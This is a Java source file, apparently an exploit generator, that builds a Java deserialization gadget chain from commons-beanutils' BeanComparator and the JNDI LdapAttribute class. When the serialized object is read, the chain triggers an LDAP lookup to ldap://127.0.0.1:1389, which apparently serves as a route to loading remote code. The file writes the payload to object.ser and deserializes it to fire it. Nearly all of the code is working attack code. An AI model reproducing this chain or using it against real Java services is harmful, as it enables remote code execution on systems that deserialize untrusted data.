package org.example;

import org.apache.commons.beanutils.BeanComparator;
import javax.naming.CompositeName;
import javax.swing.text.html.parser.Entity;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.HashMap;
import java.util.Map;
import java.util.TreeMap;
public class Payload {
    public static void main(String[] args) throws Exception {
        String ldapCtxUrl = "ldap://127.0.0.1:1389";
        Class ldapAttributeClazz = Class.forName("com.sun.jndi.ldap.LdapAttribute");
        Constructor ldapAttributeClazzConstructor = ldapAttributeClazz.getDeclaredConstructor(
                new Class[] {String.class});
        ldapAttributeClazzConstructor.setAccessible(true);
        Object ldapAttribute = ldapAttributeClazzConstructor.newInstance(
                new Object[] {"name"});
        Field baseCtxUrlField = ldapAttributeClazz.getDeclaredField("baseCtxURL");
        baseCtxUrlField.setAccessible(true);
        baseCtxUrlField.set(ldapAttribute, ldapCtxUrl);
        Field rdnField = ldapAttributeClazz.getDeclaredField("rdn");
        rdnField.setAccessible(true);
        rdnField.set(ldapAttribute, new CompositeName("a//b"));
// Generate payload
        BeanComparator comparator = new BeanComparator("class");
        Field propertyField = BeanComparator.class.getDeclaredField("property");
        propertyField.setAccessible(true);
        propertyField.set(comparator, "attributeDefinition");
        TreeMap treeMap1 = new TreeMap(comparator);
        //treeMap1.put(ldapAttribute, "aaa");
        TreeMap treeMap2 = new TreeMap(comparator);
        //treeMap2.put(ldapAttribute, "aaa");
        Field rootfield = TreeMap.class.getDeclaredField("root");
        Class entryclass = Class.forName("java.util.TreeMap$Entry");
        Class treemapclass = TreeMap.class;
        Constructor entrycor = entryclass.getDeclaredConstructors()[0];
        entrycor.setAccessible(true);
        rootfield.setAccessible(true);
        rootfield.set(treeMap1,(Map.Entry)entrycor.newInstance(ldapAttribute,"aaa",null));
        rootfield.set(treeMap2,(Map.Entry)entrycor.newInstance(ldapAttribute,"aaa",null));
        HashMap hashMap = new HashMap();
        hashMap.put(treeMap1, "bbb");
        hashMap.put(treeMap2, "ccc");
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("object.ser"));
        oos.writeObject(hashMap);
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream("object.ser"));
        ois.readObject();
        ois.close();
        oos.close();
    }
}
